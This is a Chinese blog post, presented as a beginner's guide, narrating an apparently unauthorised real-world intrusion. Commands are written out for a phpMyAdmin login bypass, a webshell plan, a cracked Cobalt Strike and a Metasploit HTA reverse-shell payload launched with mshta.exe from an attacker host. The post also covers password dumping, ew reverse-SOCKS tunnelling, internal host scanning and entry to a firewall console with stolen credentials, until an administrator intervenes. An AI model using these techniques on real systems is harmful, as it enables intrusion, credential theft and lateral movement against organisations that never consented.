@@ -1,0 +1,137 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="内网渗透"><title>我遇到的实战渗透 · 9821-zed</title><meta name="description" content="观众老爷们好啊 给大家表演个基本操作
+本文适合正在学习入门的小伙伴  师傅们就不必踏雪我了 
+第一次写文章有点细(生怕写的不好,却是也是烂)中间介绍了插件工具等 可能会看一阵子 麻烦您了多采用各种骚词(真实的内心反映)  皆是为了带动积极性希望入门的朋友把渗透当作有趣的事情来思考，抛弃枯燥乏味的感觉"><meta name="keywords"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"><script src="/js/jquery.js"></script><meta name="generator" content="Hexo 4.2.1"></head><body><div class="sidebar animated fadeInDown"><div class="logo-title"><div class="title"><img src="/images/logo@2x.png" style="width:127px;"><h3 title=""><a href="/">9821-zed</a></h3><div class="description"><p>生活只会欺负穷人，爱情也是</p></div></div></div><ul class="social-links"></ul><div class="footer"><div class="p"> <span>© 2018 - 2020 </span><i class="fa fa-star"></i><span> 内网渗透</span></div><div class="by_farbox"><span>Powered by </span><a href="https://hexo.io/zh-cn/" target="_blank">Hexo </a><span> & </span><a href="https://github.com/mrcore/hexo-theme-Anatole-Core" target="_blank">Anatole-Core  </a></div><div class="beian"><a href="http://www.beian.miit.gov.cn/" target="_blank">活着比什么都好</a><span style="height:10px;margin-left: 10px;">|</span><img src="https://qn.jixian.io/gongan.png" style="height:10px;margin-left: 10px;position: relative;top: 1px;"><span style="margin-left: 2px;">粤公网安备 44030402003967号</span></div></div></div><div class="main"><div class="page-top animated fadeInDown"><div class="nav"><li><a href="/">首页</a></li><li><a href="/archives">归档</a></li><li><a href="/tags">标签</a></li><li><a href="/about">关于</a></li><li><a href="/guestbook">留言</a></li></div><div class="information"><div class="back_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li></div></div></div><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>我遇到的实战渗透</a></h3></div><div class="post-content"><h3 id="观众老爷们好啊-给大家表演个基本操作"><a href="#观众老爷们好啊-给大家表演个基本操作" class="headerlink" title="观众老爷们好啊 给大家表演个基本操作"></a>观众老爷们好啊 给大家表演个基本操作</h3><ul>
+<li>本文适合正在学习入门的小伙伴  师傅们就不必踏雪我了 </li>
+<li>第一次写文章有点细(生怕写的不好,却是也是烂)中间介绍了插件工具等 可能会看一阵子 麻烦您了<br>多采用各种骚词(真实的内心反映)  皆是为了带动积极性希望入门的朋友把渗透当作有趣的事情来思考，抛弃枯燥乏味的感觉，冒昧之处还请多多包涵。</li>
+</ul>
+<h3 id="外网"><a href="#外网" class="headerlink" title="外网"></a>外网</h3><blockquote>
+<p><em>信息收集怎么说呢 肯定是越全面越好 但找到突破口了 就不想去收集其他了 反之如果没找到合适的突破口那可能是收集不够全</em></p>
+</blockquote>
+<ul>
+<li><p>感觉这网站（<a href="https://scan.top15.cn/web/" target="_blank" rel="noopener">https://scan.top15.cn/web/</a> ）<br>使其还不错功能挺全 查到的东西也多点 这不phpmyadmin就把头伸过来了<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200314234355-9d11f892-660a-1.png"></p>
+</li>
+<li><p>接着看  基本信息还是有必要了解下<br>工具这东西吧 好是好就是不够准确 妈蛋 Linux 都冒出来了<br>(判断网站操作系统 最快捷的就是大小写 Windows对网址中的大小写不敏感 Linux则反之) <img src="https://xzfile.aliyuncs.com/media/upload/picture/20200315191157-c8eeaf20-66ad-1.png"></p>
+</li>
+<li><p>火狐插件 判断不迷路<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200307181803-ee1f3406-605c-1.png"></p>
+</li>
+</ul>
+<ul>
+<li>火狐插件  傻蛋也是几款网络搜索中的老大哥了<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200314234452-bf0a2370-660a-1.png"></li>
+</ul>
+<ul>
+<li>好奇心使我注意到443端口 渗透就想巧克力 永远不知道下一步是啥样儿的<br>手工尝试了 简单弱口令 不行就先放着<br>后面可以尝试 爆破 注入 等等<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200307181947-2c4e56bc-605d-1.png"></li>
+</ul>
+<ul>
+<li>回到正文来 之前网站识别出来的 phpmyadmin 头还伸着呢<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200307182011-3a60ba7e-605d-1.png"></li>
+</ul>
+<ul>
+<li>得知版本2.10.3 第一件事就是百度 有问题多问度娘不行就谷哥 有万能密码() 试试就试试<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200307182100-579eae98-605d-1.png"></li>
+</ul>
+<ul>
+<li>不清楚10.3版本也可以利用该漏洞（也可以尝试爆破）<br>‘localhost’@‘@”<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200307182138-6e620e86-605d-1.png"></li>
+</ul>
+<ul>
+<li>进来后   拿shell为目的  （注意无权限）<br>第一种 phpmyadmin 熟悉两种方式 一种直接冲 into outfile  直接写 尝试失败  猜测因为万能密码原因<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200307182200-7b3641ea-605d-1.png"><br>第二种 思路：就是利用mysql的一个日志文件。这个日志文件每执行一个sql语句就会将其执行的保存。我们将这个日      志文件重命名为我们的shell.php然后执行一条sql带一句话木马的命令。然后执行菜刀连接之！<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200307182224-89d394c8-605d-1.png"><br>第二种 办法 好像此处版本太低 实现不了<br>有趣的人运气不会太差 瞧瞧咱找到什么宝贝了<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200315185207-03a36a46-66ab-1.png"></li>
+</ul>
+<ul>
+<li><p>口令在手 shell我有<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200315190517-da746bb4-66ac-1.png"></p>
+<p>那么问题来了 绝对路径怎么找 首先尝试以下url<br>phpMyAdmin/libraries/select_lang.lib.php<br>phpMyAdmin/darkblue_orange/layout.inc.php<br>phpMyAdmin/index.php?lang[]=1<br>phpmyadmin/themes/darkblue_orange/layout.inc.php</p>
+</li>
+<li><p>还有其他方法 比如info<br>有就更好  没有首先会尝试 谷歌语法了 </p>
+</li>
+</ul>
+<h5 id="三种常见搜索引擎"><a href="#三种常见搜索引擎" class="headerlink" title="三种常见搜索引擎"></a>三种常见搜索引擎</h5><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200315190645-0f28da20-66ad-1.png"><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200315190726-2729a23a-66ad-1.png"><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200315190813-43487dc4-66ad-1.png"></p>
+<ul>
+<li><p>还有种方式 就是用谷歌镜像 也还行<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200315190917-694a092a-66ad-1.png"></p>
+</li>
+<li><p>现在万事俱备只差马儿<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200307184437-a4048be2-6060-1.png"></p>
+</li>
+<li><p>刚开始蚁剑执行命令是有回显的  第二天执行就没了  让朋友看了下disable_functions什么情况  为什么要为难我<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200307184513-b9dff4a6-6060-1.png"></p>
+</li>
+<li><p>接着重新写马 试试能不能执行系统命令结果可以啊  菜刀也能执行命令 只不过变成这样回显 顶！(如果有了解情况的师傅 麻烦告知 感激不尽)<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200307184538-c8c524be-6060-1.png"></p>
+</li>
+<li><p>But 虽然没了  回显但还是能执行命令。。。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200307184610-db6978a4-6060-1.png"></p>
+</li>
+<li><p>Getshell过程没什么操作难度(太难的也操作不出来)主要是记录成长过程以及对刚入门朋友描述下大概思路</p>
+</li>
+</ul>
+<h3 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h3><blockquote>
+<p>注意服务器改端口 防止 全网爆破流 然后用screen 挂起后台运行避免ssh断了  cs清空<br>服务器用的是 阿里云学生机(一年也就一百来块)还是挺不错的</p>
+</blockquote>
+<ul>
+<li>cs  刚开始的时候上了顺手把密码抓了 看了看大致情况就睡了<br>第二天 随便执行一条命令就掉   第一天都能执行命令 密码都抓了哦  现在说掉就掉  吊！<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200307185140-a0234120-6061-1.png"><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200315200405-119982e8-66b5-1.png"></li>
+</ul>
+<h5 id="佳哥让试试msf-可能是我的cs有问题"><a href="#佳哥让试试msf-可能是我的cs有问题" class="headerlink" title="佳哥让试试msf 可能是我的cs有问题"></a>佳哥让试试msf 可能是我的cs有问题</h5><ul>
+<li><p>msf生成hta</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;misc&#x2F;hta_server</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost xx.xx.xx.xx</span><br><span class="line">set lport 6666</span><br></pre></td></tr></table></figure>
+<p>执行 mshta.exe <a href="http://xx.xx.xx.xx/pKz4Kk059Nq9.hta" target="_blank" rel="noopener">http://xx.xx.xx.xx/pKz4Kk059Nq9.hta</a><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200307185241-c4ab51e0-6061-1.png"></p>
+</li>
+<li><p>查找了下域控ip 192.168.30.61<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200307185313-d7d8beec-6061-1.png"></p>
+</li>
+<li><p>这里存活ip检测不够准确(后面cs扫还有给.11主机)<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200307185341-e8392484-6061-1.png"></p>
+</li>
+<li><p>这里 还打过ms17_010无果 忘了截图了————–<br>Msf好久没用 不知道感觉用些什么了 还是上cs把 直观点  msf可以转发到cs<br>但那操作还不如我直接上cs来的快(说白了 就是懒)</p>
+</li>
+</ul>
+<h5 id="第二天带着疯狂掉线疑问-问了前辈-告知是由于破解没完全-发了个破解完全了版本-重新拉起"><a href="#第二天带着疯狂掉线疑问-问了前辈-告知是由于破解没完全-发了个破解完全了版本-重新拉起" class="headerlink" title="第二天带着疯狂掉线疑问 问了前辈 告知是由于破解没完全 发了个破解完全了版本 重新拉起"></a>第二天带着疯狂掉线疑问 问了前辈 告知是由于破解没完全 发了个破解完全了版本 重新拉起</h5><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200307185723-6c8a184c-6062-1.png"></p>
+<ul>
+<li><p>到内网 先看是否是域环境 接下来顺序<br>提权&gt;毕竟很多命令或者程序需要高权限能省不少麻烦(这里已经最高权限)<br>横向渗透&gt;扩展姿势(ms17_010、口令碰撞、哈希传递、内网web、弱口令其实也就是信息收集过程<br>拿下域控&gt;毕竟域控才是王道</p>
+</li>
+<li><p>systeminfo  能看到很多本机信息<br>收集到的信息为 域环境 虚拟机 2012服务器等 补丁虽然很全 但上来就是最高权限 舒服了<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200307185756-8036ace8-6062-1.png"><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200315184812-77c56e70-66aa-1.png"><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200315184900-941b7d8a-66aa-1.png"></p>
+</li>
+</ul>
+<ul>
+<li><p>在域内却执行不了 域命令  真是什么奇葩环境都被我遇到了<br>平时看师傅们文章也没见过这些问题 还是要自己动手才晓得长记性</p>
+</li>
+<li><p>接着了解到 是域机器但不是域会话  说白了 就是没域用户 现在这个用户是本地最高权限<br>那还说啥  查看进程  把会话注入到有域用户上<br>还有种方式 就通过抓取到的口令 用make_token仿冒域用户<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200315184651-4767f68a-66aa-1.png"></p>
+</li>
+<li><p>这真不清楚了   去他妈的  好惨一男的<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200315184510-0b0e9766-66aa-1.png"></p>
+</li>
+</ul>
+<ul>
+<li>后来发现自己一开始就错了  一开始看到systeminfo写的域 以为有域 毕竟长的太像了！！！<br>结果自己本机测试  工作组可以修改名字然后systeminfo就会出现类似于域名 例如<br>哎 这该死的名字！ 之前还坐了一顿傻逼操作 秀到自己了 还以为是域控关机下线或者迁移了(域内所有主机域用户或者命令都要经过域控执行)<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200307190046-e57da4bc-6062-1.png"></li>
+</ul>
+<h5 id="But也不对啊-如果是工作组-域都是大写-他是怎么办到小写的"><a href="#But也不对啊-如果是工作组-域都是大写-他是怎么办到小写的" class="headerlink" title="But也不对啊 如果是工作组 域都是大写  他是怎么办到小写的"></a>But也不对啊 如果是工作组 域都是大写  他是怎么办到小写的</h5><h6 id="再者-前面用Msf都能看到域控Ip-难道误报？？？"><a href="#再者-前面用Msf都能看到域控Ip-难道误报？？？" class="headerlink" title="再者 前面用Msf都能看到域控Ip 难道误报？？？"></a>再者 前面用Msf都能看到域控Ip 难道误报？？？</h6><ul>
+<li><p>这里不是有口令嘛 3389上去看看 这么神奇的玩意儿 到底啥样儿<br>cs 自带sock4<br>通过cs  建立sock4代理  加上 windows下面 proxifier </p>
+<p>ew(frp也可以但感觉用起没ew顺手)<br>目标: shell ew_win32.exe -s rssocks -d x.x.x.x. -e 1024<br>公网ip: ./ew_linux_x64 -s rcsocks -l 1024 -e 1080 &amp;<br>再用proxifier 连接  </p>
+<p>还有就是msfconsole 也自带端口转发<br>cs的端口也带转发 不成功 不清楚原因 说无法绑定<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200307190120-fa122c40-6062-1.png"></p>
+</li>
+<li><p>上去看了一眼啥都没 空空荡荡 也没什么可翻找的 就退了 毕竟 用的sock4 慢点一逼</p>
+</li>
+</ul>
+<blockquote>
+<p>推荐 cs插件脚本 感觉挺全的挑着顺手的用还是有必要的（<a href="https://www.codercto.com/a/57741.html" target="_blank" rel="noopener">https://www.codercto.com/a/57741.html</a>  ）</p>
+</blockquote>
+<h5 id="不管了-这里就当是工作组环境"><a href="#不管了-这里就当是工作组环境" class="headerlink" title="不管了 这里就当是工作组环境"></a>不管了 这里就当是工作组环境</h5><ul>
+<li><p>工作组 无非就是撞口令、永恒之蓝、搞WEB  不让用域命令 我扫可以趴 反正就是得搞你<br>横向准备工作</p>
+</li>
+<li><p>存活ip<br>循环ping 查找存活ip 不用上传 cmd 执行<br>for /l %i in (1,1,255) do @ ping 192.168.124.%i -w 1 -n 1|find /i “ttl=”<br>nbtscan 扫描内网存活ip 及目标所属(看到域了)  大家都在用  上面脚本中有个一键上传的脚本<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200307190157-0fc4aa90-6063-1.png"><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200307190222-1ef406d2-6063-1.png"></p>
+</li>
+<li><p>端口开放 浏览器代理访问 看看是些什么东东<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200314234110-3abb8ef6-660a-1.png"></p>
+</li>
+</ul>
+<ul>
+<li>内网几台机器WEB 似乎都转发出来了 因为在外网也能看到 而且能访问登陆<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200307192954-f7632496-6066-1.png"><br>外网访问目标网站443端口就出来了  应该是端口转发或者NAT<br>web 刚开始弱口令进不去 后来想到不是抓取的有管理密码 当一下的就进去了<br>眼瞅着是边界防火墙设备 看了下配置规则没什么特别<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200307193019-066e4470-6067-1.png"></li>
+</ul>
+<ul>
+<li>直到昨晚动静太大  惊动管理员了  一直在线而且配置了 规则也代理不出来 访问web的防火墙密码也改了 完蛋 ~<br>由于内网工作组环境 没有通杀漏洞、口令不通用、web有但无法代理的情况下  想不到其他思路继续进行、 当然也可以通过键盘记录、口令爆破等非常规方法进行由于太耗时就不再深入，对不起<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200314234047-2c81396c-660a-1.png"><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200314234701-0b8513ea-660b-1.png"><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200307193122-2bfeb68e-6067-1.png"></li>
+</ul>
+<h3 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h3><ul>
+<li><p>文笔垃圾、措辞轻浮、内容尚浅、操作生疏、不足之处还求多多包涵和指正，感激不尽<br>感谢给予帮助的繁兴、Zed、以及白帽100少先队里面个个都是人才说话又好听，最后谢谢你<br>这是一次失败的渗透、但也是很好的开始</p>
+</li>
+<li><p>安全须知：<br>安全你我他 网络靠大家 请勿复现！<br>本文章经用于经验及交流，严禁用于非法操作，出现后果一切自行承担，阅读此文章表示你已同意。</p>
+</li>
+</ul>
+</div><div class="post-footer"><div class="meta"><div class="info"><i class="fa fa-sun-o"></i><span class="date">2020-06-02</span><i class="fa fa-tag"></i><a class="tag" href="/tags/实战/" title="实战">实战 </a><span class="leancloud_visitors"></span></div></div></div></div><div class="share"><div class="evernote"><a class="fa fa-bookmark" href="" onclick="javascript:join_favorite()" ref="sidebar"></a></div><div class="weibo"><a class="fa fa-weibo" href="javascript:void((function(s,d,e){try{}catch(e){}var f='http://service.weibo.com/share/share.php?',u=d.location.href,p=['url=',e(u),'&amp;title=',e(d.title),'&amp;appkey=2924220432'].join('');function a(){if(!window.open([f,p].join(''),'mb',['toolbar=0,status=0,resizable=1,width=620,height=450,left=',(s.width-620)/2,',top=',(s.height-450)/2].join('')))u.href=[f,p].join('');};if(/Firefox/.test(navigator.userAgent)){setTimeout(a,0)}else{a()}})(screen,document,encodeURIComponent));"></a></div><div class="twitter"><a class="fa fa-twitter" href="http://twitter.com/home?status=,http://yoursite.com/2020/06/02/我遇到的实战渗透/,9821-zed,我遇到的实战渗透,;" target="_blank" rel="noopener"></a></div></div><div class="pagination"><ul class="clearfix"><li class="pre pagbuttons"><a class="btn" role="navigation" href="/2020/06/13/powershell%E6%B7%B7%E6%B7%86%E5%8F%8A%E5%85%8D%E6%9D%80/" title="关于powershell免杀的探索">上一篇</a></li></ul></div><script src="/js/visitors.js"></script><a id="comments"></a><div id="vcomments" style="margin:0 30px;"></div><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//cdn.jsdelivr.net/gh/xcss/valine@latest/dist/Valine.min.js"></script><script>var valine = new Valine({
+  el:'#vcomments',
+  notify:true || false, 
+  verify:false|| false, 
+  app_id:'rsRSoR5fW0Fh2Q7CvgJsm1v2-gzGzoHsz',
+  app_key:'3srXHzWwmq9S19ucPADetjyI',
+  placeholder:'你知道我在等你吗！',
+  path: window.location.pathname,
+  serverURLs: '',
+  visitor:true,
+  recordIP:true,
+  avatar:'mm'
+})</script></div></div></div></div><script src="/js/jquery-migrate-1.2.1.min.js"></script><script src="/js/jquery.appear.js"></script><script src="/js/add-bookmark.js"></script><script src="/js/baidu-tongji.js"></script></body></html>
